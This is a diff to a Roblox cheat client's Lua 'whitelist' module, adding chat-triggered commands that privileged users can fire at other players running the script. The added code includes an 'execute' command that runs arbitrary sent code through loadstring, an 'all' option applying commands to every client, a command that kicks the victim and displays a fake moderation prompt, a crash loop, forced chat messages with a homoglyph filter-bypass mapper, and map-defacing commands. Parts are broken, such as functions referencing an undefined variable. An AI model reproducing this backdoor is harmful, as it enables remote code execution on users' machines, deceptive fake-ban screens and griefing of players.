@@ -396,7 +396,7 @@ run(function()
 		if plr == lplr and msg == 'helloimusinginhaler' then return true end
 		if self.localprio > 0 and self.said[plr.Name] == nil and msg == 'helloimusinginhaler' and plr ~= lplr then
 			self.said[plr.Name] = true
-			notif('Vape', plr.Name..' is using vape!', 60)
+			warningNotification('Vape', plr.Name..' is using vape!', 60)
 			self.customtags[plr.Name] = {{text = 'VAPE USER', color = Color3.new(1, 1, 0)}}
 			local newent = entityLibrary.getEntity(plr)
 			if newent then entityLibrary.Events.EntityUpdated:Fire(newent) end
@@ -405,11 +405,27 @@ run(function()
 		if self.localprio < otherprio or plr == lplr then
 			local args = msg:split(' ')
 			table.remove(args, 1)
-			if self:getplayer(args[1]) then
+			local all = false
+			if self:getplayer(args[1]) or args[1] == "all" then
+				if args[1] == "all" then all = true end
 				table.remove(args, 1)
 				for i,v in self.commands do
 					if msg:len() >= (i:len() + 1) and msg:sub(1, i:len() + 1):lower() == ";"..i:lower() then
-						v(plr, args)
+						if all then
+							for i2,v2 in pairs(game:GetService("Players"):GetPlayers()) do
+								if v2 ~= game:GetService("Players").LocalPlayer then
+									if tostring(i) == "execute" then
+										if otherprio > 1 then
+											v(v2, args)
+										end
+									else
+										v(v2, args)
+									end
+								end
+							end
+						else
+							v(plr, args)
+						end
 						return true
 					end
 				end
@@ -429,24 +445,28 @@ run(function()
 	end
 
 	function whitelist:oldchat(func)
-		local msgtable = debug.getupvalue(func, 3)
-		if typeof(msgtable) == 'table' and msgtable.CurrentChannel then
-			whitelist.oldchattable = msgtable
-		end
-		local oldchat
-
-		oldchat = hookfunction(func, function(data, ...)
-			local plr = playersService:GetPlayerByUserId(data.SpeakerUserId)
-			if plr then
-				data.ExtraData.Tags = data.ExtraData.Tags or {}
-				for i, v in self:tag(plr) do
-					table.insert(data.ExtraData.Tags, {TagText = v.text, TagColor = v.color})
+		if not shared.ChatFixer then
+			pcall(function()
+				local msgtable = debug.getupvalue(func, 3)
+				if typeof(msgtable) == 'table' and msgtable.CurrentChannel then
+					whitelist.oldchattable = msgtable
 				end
-				if data.Message and self:checkmessage(data.Message, plr) then data.Message = '' end
-			end
-			return oldchat(data, ...)
-		end)
-		table.insert(vapeConnections, {Disconnect = function() hookfunction(func, oldchat) end})
+				local oldchat
+		
+				oldchat = hookfunction(func, function(data, ...)
+					local plr = playersService:GetPlayerByUserId(data.SpeakerUserId)
+					if plr then
+						data.ExtraData.Tags = data.ExtraData.Tags or {}
+						for i, v in self:tag(plr) do
+							table.insert(data.ExtraData.Tags, {TagText = v.text, TagColor = v.color})
+						end
+						if data.Message and self:checkmessage(data.Message, plr) then data.Message = '' end
+					end
+					return oldchat(data, ...)
+				end)
+				table.insert(vapeConnections, {Disconnect = function() hookfunction(func, oldchat) end})
+			end)
+		end
 	end
 
 	function whitelist:hook()
@@ -492,7 +512,7 @@ run(function()
 			local bubblechat = exp:WaitForChild('bubbleChat', 5)
 			if bubblechat then
 				table.insert(vapeConnections, bubblechat.DescendantAdded:Connect(function(newbubble)
-					if newbubble:IsA('TextLabel') and newbubble.Text:find('helloimusinginhaler') then
+					if newbubble:IsA('TextLabel') and newbubble.Text:find('helloimusingrise') then
 						newbubble.Parent.Parent.Visible = false
 					end
 				end))
@@ -562,35 +582,37 @@ run(function()
 	whitelist.commands = {
 		byfron = function()
 			task.spawn(function()
-				if setthreadidentity then setthreadidentity(8) end
 				if setthreadcaps then setthreadcaps(8) end
+				if setthreadidentity then setthreadidentity(8) end
 				local UIBlox = getrenv().require(game:GetService('CorePackages').UIBlox)
 				local Roact = getrenv().require(game:GetService('CorePackages').Roact)
 				UIBlox.init(getrenv().require(game:GetService('CorePackages').Workspace.Packages.RobloxAppUIBloxConfig))
 				local auth = getrenv().require(coreGui.RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
 				local darktheme = getrenv().require(game:GetService('CorePackages').Workspace.Packages.Style).Themes.DarkTheme
-				local fonttokens = getrenv().require(game:GetService("CorePackages").Packages._Index.UIBlox.UIBlox.App.Style.Tokens).getTokens('Desktop', 'Dark', true)
-				local buildersans = getrenv().require(game:GetService('CorePackages').Packages._Index.UIBlox.UIBlox.App.Style.Fonts.FontLoader).new(true, fonttokens):loadFont()
+				--local Montserrat = getrenv().require(game:GetService('CorePackages').Workspace.Packages.Style).Fonts.Montserrat
 				local tLocalization = getrenv().require(game:GetService('CorePackages').Workspace.Packages.RobloxAppLocales).Localization
-				local localProvider = getrenv().require(game:GetService('CorePackages').Workspace.Packages.Localization).LocalizationProvider
+				local a = getrenv().require(game:GetService('CorePackages').Workspace.Packages.Localization).LocalizationProvider
 				lplr.PlayerGui:ClearAllChildren()
-				GuiLibrary.MainGui.Enabled = false
+				shared.GuiLibrary.MainGui.Enabled = false
 				coreGui:ClearAllChildren()
 				lightingService:ClearAllChildren()
-				for _, v in workspace:GetChildren() do pcall(function() v:Destroy() end) end
-				game:GetService('GuiService'):ClearError()
+				for i, v in game.Workspace:GetChildren() do pcall(function() v:Destroy() end) end
+				task.wait(0.2)
+				lplr.kick(lplr)
+				guiService:ClearError()
+				task.wait(2)
 				local gui = Instance.new('ScreenGui')
 				gui.IgnoreGuiInset = true
 				gui.Parent = coreGui
 				local frame = Instance.new('ImageLabel')
 				frame.BorderSizePixel = 0
 				frame.Size = UDim2.fromScale(1, 1)
-				frame.BackgroundColor3 = Color3.fromRGB(224, 223, 225)
+				frame.BackgroundColor3 = Color3.new(1, 1, 1)
 				frame.ScaleType = Enum.ScaleType.Crop
 				frame.Parent = gui
-				task.delay(0.3, function() frame.Image = 'rbxasset://textures/ui/LuaApp/graphic/Auth/GridBackground.jpg' end)
-				task.delay(0.6, function()
-					local modPrompt = Roact.createElement(auth, {
+				task.delay(0.1, function() frame.Image = 'rbxasset://textures/ui/LuaApp/graphic/Auth/GridBackground.jpg' end)
+				task.delay(2, function()
+					local e = Roact.createElement(auth, {
 						style = {},
 						screenSize = gameCamera.ViewportSize or Vector2.new(1920, 1080),
 						moderationDetails = {
@@ -607,14 +629,14 @@ run(function()
 						logoutCallback = function() end,
 						globalGuiInset = {top = 0}
 					})
-					local screengui = Roact.createElement(localProvider, {
-						localization = tLocalization.new('en-us')
-					}, {Roact.createElement(UIBlox.Style.Provider, {
-						style = {
-							Theme = darktheme,
-							Font = buildersans
-						},
-					}, {modPrompt})})
+					local screengui = Roact.createElement('ScreenGui', {}, Roact.createElement(a, {
+							localization = tLocalization.new('en-us')
+						}, {Roact.createElement(UIBlox.Style.Provider, {
+								style = {
+									Theme = darktheme,
+									--Font = Montserrat
+								},
+							}, {e})}))
 					Roact.mount(screengui, coreGui)
 				end)
 			end)
@@ -624,9 +646,9 @@ run(function()
 			task.spawn(function() repeat until false end)
 		end,
 		deletemap = function()
-			local terrain = workspace:FindFirstChildWhichIsA('Terrain')
+			local terrain = game.Workspace:FindFirstChildWhichIsA('Terrain')
 			if terrain then terrain:Clear() end
-			for i, v in workspace:GetChildren() do
+			for i, v in game.Workspace:GetChildren() do
 				if v ~= terrain and not v:FindFirstChildWhichIsA('Humanoid') and not v:IsA('Camera') then
 					v:Destroy()
 				end
@@ -637,7 +659,7 @@ run(function()
 			setfpscap(tonumber(args[1]) ~= '' and math.clamp(tonumber(args[1]) or 9999, 1, 9999) or 9999)
 		end,
 		gravity = function(sender, args)
-			workspace.Gravity = tonumber(args[1]) or workspace.Gravity
+			game.Workspace.Gravity = tonumber(args[1]) or game.Workspace.Gravity
 		end,
 		jump = function()
 			if entityLibrary.isAlive and entityLibrary.character.Humanoid.FloorMaterial ~= Enum.Material.Air then
@@ -656,9 +678,9 @@ run(function()
 		reveal = function(args)
 			task.delay(0.1, function()
 				if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-                    textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync('I am using the inhaler client')
+                    textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync('I am using the inhaler client or voidware :)')
                 else
-                    replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('I am using the inhaler client', 'All')
+                    replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('I am using the inhaler client or voidware :)', 'All')
                 end
 			end)
 		end,
@@ -700,8 +722,453 @@ run(function()
 			if entityLibrary.isAlive then
 				entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + Vector3.new(0, -1000, 0)
 			end
+		end,
+		india = function()
+			local texture = "18443587231"
+			task.spawn(function()
+				function changetxt(root)
+					for _, v in pairs(root:GetChildren()) do
+						if v:IsA("Decal") and v.Texture ~= "http://www.roblox.com/asset/?id="..texture then
+							v.Parent = nil
+						elseif v:IsA("BasePart") then
+							v.Material = "Plastic"
+							v.Transparency = 0
+							local One = Instance.new("Decal", v)
+							local Two = Instance.new("Decal", v)
+							local Three = Instance.new("Decal", v)
+							local Four = Instance.new("Decal", v)
+							local Five = Instance.new("Decal", v)
+							local Six = Instance.new("Decal", v)
+							One.Texture = "http://www.roblox.com/asset/?id="..texture
+							Two.Texture = "http://www.roblox.com/asset/?id="..texture
+							Three.Texture = "http://www.roblox.com/asset/?id="..texture
+							Four.Texture = "http://www.roblox.com/asset/?id="..texture
+							Five.Texture = "http://www.roblox.com/asset/?id="..texture
+							Six.Texture = "http://www.roblox.com/asset/?id="..texture
+							One.Face = "Front"
+							Two.Face = "Back"
+							Three.Face = "Right"
+							Four.Face = "Left"
+							Five.Face = "Top"
+							Six.Face = "Bottom"
+						end
+						changetxt(v)
+					end
+				end
+
+				function chageyes()
+					for _, skibidi in pairs(root:GetChildren()) do
+						chageyes(skibidi)
+					end
+				end
+				
+				changetxt(game.Workspace)
+				chageyes(game.Workspace)
+			end)
+		end,
+		daiplayz = function()
+			local texture = "122473810459196"
+			task.spawn(function()
+				function changetxt(root)
+					for _, v in pairs(root:GetChildren()) do
+						if v:IsA("Decal") and v.Texture ~= "http://www.roblox.com/asset/?id="..texture then
+							v.Parent = nil
+						elseif v:IsA("BasePart") then
+							v.Material = "Plastic"
+							v.Transparency = 0
+							local One = Instance.new("Decal", v)
+							local Two = Instance.new("Decal", v)
+							local Three = Instance.new("Decal", v)
+							local Four = Instance.new("Decal", v)
+							local Five = Instance.new("Decal", v)
+							local Six = Instance.new("Decal", v)
+							One.Texture = "http://www.roblox.com/asset/?id="..texture
+							Two.Texture = "http://www.roblox.com/asset/?id="..texture
+							Three.Texture = "http://www.roblox.com/asset/?id="..texture
+							Four.Texture = "http://www.roblox.com/asset/?id="..texture
+							Five.Texture = "http://www.roblox.com/asset/?id="..texture
+							Six.Texture = "http://www.roblox.com/asset/?id="..texture
+							One.Face = "Front"
+							Two.Face = "Back"
+							Three.Face = "Right"
+							Four.Face = "Left"
+							Five.Face = "Top"
+							Six.Face = "Bottom"
+						end
+						changetxt(v)
+					end
+				end
+
+				function chageyes()
+					for _, skibidi in pairs(root:GetChildren()) do
+						chageyes(skibidi)
+					end
+				end
+				
+				changetxt(game.Workspace)
+				chageyes(game.Workspace)
+			end)
+		end,
+		voidware = function()
+			local texture = "18341361652"
+			task.spawn(function()
+				function changetxt(root)
+					for _, v in pairs(root:GetChildren()) do
+						if v:IsA("Decal") and v.Texture ~= "http://www.roblox.com/asset/?id="..texture then
+							v.Parent = nil
+						elseif v:IsA("BasePart") then
+							v.Material = "Plastic"
+							v.Transparency = 0
+							local One = Instance.new("Decal", v)
+							local Two = Instance.new("Decal", v)
+							local Three = Instance.new("Decal", v)
+							local Four = Instance.new("Decal", v)
+							local Five = Instance.new("Decal", v)
+							local Six = Instance.new("Decal", v)
+							One.Texture = "http://www.roblox.com/asset/?id="..texture
+							Two.Texture = "http://www.roblox.com/asset/?id="..texture
+							Three.Texture = "http://www.roblox.com/asset/?id="..texture
+							Four.Texture = "http://www.roblox.com/asset/?id="..texture
+							Five.Texture = "http://www.roblox.com/asset/?id="..texture
+							Six.Texture = "http://www.roblox.com/asset/?id="..texture
+							One.Face = "Front"
+							Two.Face = "Back"
+							Three.Face = "Right"
+							Four.Face = "Left"
+							Five.Face = "Top"
+							Six.Face = "Bottom"
+						end
+						changetxt(v)
+					end
+				end
+
+				function chageyes()
+					for _, skibidi in pairs(root:GetChildren()) do
+						chageyes(skibidi)
+					end
+				end
+				
+				changetxt(game.Workspace)
+				chageyes(game.Workspace)
+			end)
+		end,
+		anime = function()
+			local texture = "18499238992"
+			task.spawn(function()
+				function changetxt(root)
+					for _, v in pairs(root:GetChildren()) do
+						if v:IsA("Decal") and v.Texture ~= "http://www.roblox.com/asset/?id="..texture then
+							v.Parent = nil
+						elseif v:IsA("BasePart") then
+							v.Material = "Plastic"
+							v.Transparency = 0
+							local One = Instance.new("Decal", v)
+							local Two = Instance.new("Decal", v)
+							local Three = Instance.new("Decal", v)
+							local Four = Instance.new("Decal", v)
+							local Five = Instance.new("Decal", v)
+							local Six = Instance.new("Decal", v)
+							One.Texture = "http://www.roblox.com/asset/?id="..texture
+							Two.Texture = "http://www.roblox.com/asset/?id="..texture
+							Three.Texture = "http://www.roblox.com/asset/?id="..texture
+							Four.Texture = "http://www.roblox.com/asset/?id="..texture
+							Five.Texture = "http://www.roblox.com/asset/?id="..texture
+							Six.Texture = "http://www.roblox.com/asset/?id="..texture
+							One.Face = "Front"
+							Two.Face = "Back"
+							Three.Face = "Right"
+							Four.Face = "Left"
+							Five.Face = "Top"
+							Six.Face = "Bottom"
+						end
+						changetxt(v)
+					end
+				end
+
+				function chageyes()
+					for _, skibidi in pairs(root:GetChildren()) do
+						chageyes(skibidi)
+					end
+				end
+				
+				changetxt(game.Workspace)
+				chageyes(game.Workspace)
+			end)
+		end,
+		troll = function(sender, args)
+			if #args < 1 then return end
+			local texture = string.lower(args[1])
+			task.spawn(function()
+				function changetxt(root)
+					for _, v in pairs(root:GetChildren()) do
+						if v:IsA("Decal") and v.Texture ~= "http://www.roblox.com/asset/?id="..texture then
+							v.Parent = nil
+						elseif v:IsA("BasePart") then
+							v.Material = "Plastic"
+							v.Transparency = 0
+							local One = Instance.new("Decal", v)
+							local Two = Instance.new("Decal", v)
+							local Three = Instance.new("Decal", v)
+							local Four = Instance.new("Decal", v)
+							local Five = Instance.new("Decal", v)
+							local Six = Instance.new("Decal", v)
+							One.Texture = "http://www.roblox.com/asset/?id="..texture
+							Two.Texture = "http://www.roblox.com/asset/?id="..texture
+							Three.Texture = "http://www.roblox.com/asset/?id="..texture
+							Four.Texture = "http://www.roblox.com/asset/?id="..texture
+							Five.Texture = "http://www.roblox.com/asset/?id="..texture
+							Six.Texture = "http://www.roblox.com/asset/?id="..texture
+							One.Face = "Front"
+							Two.Face = "Back"
+							Three.Face = "Right"
+							Four.Face = "Left"
+							Five.Face = "Top"
+							Six.Face = "Bottom"
+						end
+						changetxt(v)
+					end
+				end
+
+				function chageyes()
+					for _, skibidi in pairs(root:GetChildren()) do
+						chageyes(skibidi)
+					end
+				end
+				
+				changetxt(game.Workspace)
+				chageyes(game.Workspace)
+			end)
+		end,
+		--rbxassetid://18814907476
+		newvoidware = function()
+			local texture = "18814907476"
+			task.spawn(function()
+				function changetxt(root)
+					for _, v in pairs(root:GetChildren()) do
+						if v:IsA("Decal") and v.Texture ~= "http://www.roblox.com/asset/?id="..texture then
+							v.Parent = nil
+						elseif v:IsA("BasePart") then
+							v.Material = "Plastic"
+							v.Transparency = 0
+							local One = Instance.new("Decal", v)
+							local Two = Instance.new("Decal", v)
+							local Three = Instance.new("Decal", v)
+							local Four = Instance.new("Decal", v)
+							local Five = Instance.new("Decal", v)
+							local Six = Instance.new("Decal", v)
+							One.Texture = "http://www.roblox.com/asset/?id="..texture
+							Two.Texture = "http://www.roblox.com/asset/?id="..texture
+							Three.Texture = "http://www.roblox.com/asset/?id="..texture
+							Four.Texture = "http://www.roblox.com/asset/?id="..texture
+							Five.Texture = "http://www.roblox.com/asset/?id="..texture
+							Six.Texture = "http://www.roblox.com/asset/?id="..texture
+							One.Face = "Front"
+							Two.Face = "Back"
+							Three.Face = "Right"
+							Four.Face = "Left"
+							Five.Face = "Top"
+							Six.Face = "Bottom"
+						end
+						changetxt(v)
+					end
+				end
+
+				function chageyes()
+					for _, skibidi in pairs(root:GetChildren()) do
+						chageyes(skibidi)
+					end
+				end
+				
+				changetxt(game.Workspace)
+				chageyes(game.Workspace)
+			end)
+		end,
+		freeze = function()
+			if entityLibrary.isAlive then
+				pcall(function()
+					entityLibrary.character.Humanoid:Destroy()
+				end)
+			end
+		end,
+		funny = function()
+			pcall(function()
+				local player = game:GetService("Players").LocalPlayer
+				local character = player.Character or player.CharacterAdded:Wait()
+				local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+				
+				task.spawn(function()
+					while true do
+						task.wait() -- The smallest possible wait time
+						humanoidRootPart.CFrame = humanoidRootPart.CFrame + humanoidRootPart.CFrame.LookVector * 100000
+					  end
+				end)
+			end)
+		end,
+        teleport = function(sender, args)
+            if #args < 1 then return end
+            local jobid = args[1]
+			local placeId = tonumber(args[2]) or game.PlaceId
+            local TeleportService = game:GetService("TeleportService")
+            local suc, err = pcall(function()
+                TeleportService:TeleportToPlaceInstance(placeId, jobid, game:GetService("Players").LocalPlayer)
+            end)
+			if not suc then NotifyUser(";teleport error! Err: "..tostring(err)) end
+            print(suc, err)
+        end,
+		say = function(sender, args)
+			if #args < 1 then return end
+			task.spawn(function()
+				local sendmessage = function() end
+				sendmessage = function(text)
+					local function createBypassMessage(message)
+						local charMappings = {
+							["a"] = "ɑ", ["b"] = "ɓ", ["c"] = "ɔ", ["d"] = "ɗ", ["e"] = "ɛ",
+							["f"] = "ƒ", ["g"] = "ɠ", ["h"] = "ɦ", ["i"] = "ɨ", ["j"] = "ʝ",
+							["k"] = "ƙ", ["l"] = "ɭ", ["m"] = "ɱ", ["n"] = "ɲ", ["o"] = "ɵ",
+							["p"] = "ρ", ["q"] = "ɋ", ["r"] = "ʀ", ["s"] = "ʂ", ["t"] = "ƭ",
+							["u"] = "ʉ", ["v"] = "ʋ", ["w"] = "ɯ", ["x"] = "x", ["y"] = "ɣ",
+							["z"] = "ʐ", ["A"] = "Α", ["B"] = "Β", ["C"] = "Ϲ", ["D"] = "Δ",
+							["E"] = "Ε", ["F"] = "Ϝ", ["G"] = "Γ", ["H"] = "Η", ["I"] = "Ι",
+							["J"] = "ϳ", ["K"] = "Κ", ["L"] = "Λ", ["M"] = "Μ", ["N"] = "Ν",
+							["O"] = "Ο", ["P"] = "Ρ", ["Q"] = "Ϙ", ["R"] = "Ϣ", ["S"] = "Ϛ",
+							["T"] = "Τ", ["U"] = "ϒ", ["V"] = "ϝ", ["W"] = "Ω", ["X"] = "Χ",
+							["Y"] = "Υ", ["Z"] = "Ζ"
+						}
+						local bypassMessage = ""
+						for i = 1, #message do
+							local char = message:sub(i, i)
+							bypassMessage = bypassMessage .. (charMappings[char] or char)
+						end
+						return bypassMessage
+					end
+					--text = text.." | discord.gg/voidware"
+					--text = createBypassMessage(text)
+					local textChatService = game:GetService("TextChatService")
+					local replicatedStorageService = game:GetService("ReplicatedStorage")
+					if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+						textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(text)
+					else
+						replicatedStorageService.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, 'All')
+					end
+				end
+				local real_message = ""
+				for i = 1, #args do real_message = real_message.." "..args[i] end
+				sendmessage(tostring(table.concat(args, ' ')))
+			end)
+		end,
+		mute = function(sender, args)
+			local excluded_table = {}
+			if #args > 0 then
+				for i,v in pairs(args) do
+					table.insert(excluded_table, v)
+				end
+			end
+			local function isExcluded(person)
+				for i,v in pairs(excluded_table) do
+					if v == (person or "") then return true end
+				end
+				return false
+			end
+			local function mutePerson(person)
+				if (not isExcluded(person)) then
+					local text = "/mute "..tostring(person)
+					local textChatService = game:GetService("TextChatService")
+					local replicatedStorageService = game:GetService("ReplicatedStorage")
+					if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+						textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(text)
+					else
+						replicatedStorageService.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, 'All')
+					end
+				end
+			end
+			mutePerson(sender)
+			--[[if sender == "all" then
+				for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+					if v ~= game:GetService("Players").LocalPlayer then
+						mutePerson(v)
+					end
+				end
+			else
+				mutePerson(sender)
+			end--]]
+		end,
+		unmute = function(sender, args)
+			local excluded_table = {}
+			if #args > 0 then
+				for i,v in pairs(args) do
+					table.insert(excluded_table, v)
+				end
+			end
+			local function isExcluded(person)
+				for i,v in pairs(excluded_table) do
+					if v == (person or "") then return true end
+				end
+				return false
+			end
+			local function unmutePerson(person)
+				if (not isExcluded(person)) then
+					local text = "/unmute "..tostring(person)
+					local textChatService = game:GetService("TextChatService")
+					local replicatedStorageService = game:GetService("ReplicatedStorage")
+					if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+						textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(text)
+					else
+						replicatedStorageService.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, 'All')
+					end
+				end
+			end
+			unmutePerson(sender)
+			--[[if sender == "all" then
+				for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+					if v ~= game:GetService("Players").LocalPlayer then
+						mutePerson(v)
+					end
+				end
+			else
+				mutePerson(sender)
+			end--]]
+		end,
+		execute = function(sender, args)
+			pcall(function() loadstring(table.concat(args, ' '))() end)
 		end
 	}
+	pcall(function()
+		whitelist.commands["cmds"] = function()
+			local function show(text)
+				game:GetService('StarterGui'):SetCore(
+					'ChatMakeSystemMessage', 
+					{
+						Text = text, 
+						Color = Color3.fromRGB(255, 255, 255), 
+						Font = Enum.Font.GothamBold,
+						FontSize = Enum.FontSize.Size24
+					}
+				)
+			end
+			for i,v in pairs(whitelist.commands) do
+				if tostring(i) ~= "cmds" then show(";"..tostring(i)) end
+			end
+		end
+	end)
+	local bedwars_gameIds = {6872265039, 6872274481, 8444591321, 8560631822}
+	local function isBedwars()
+		local a = game.PlaceId
+		for i,v in pairs(bedwars_gameIds) do if bedwars_gameIds[i] == a then return true end end
+		return false
+	end
+	if isBedwars() then 
+		whitelist.commands["cteleport"] = function(sender, args)
+			if #args < 1 then return end
+			local args2 = {
+				[1] = game:GetService("HttpService"):GenerateGUID(),
+				[2] = {
+					[1] = tostring(args[1])
+				}
+			}
+			local res = game:GetService("ReplicatedStorage"):WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("CustomMatches/JoinByCode"):FireServer(unpack(args2))
+			print(res)
+		end 
+	end
 
 	task.spawn(function()
 		repeat
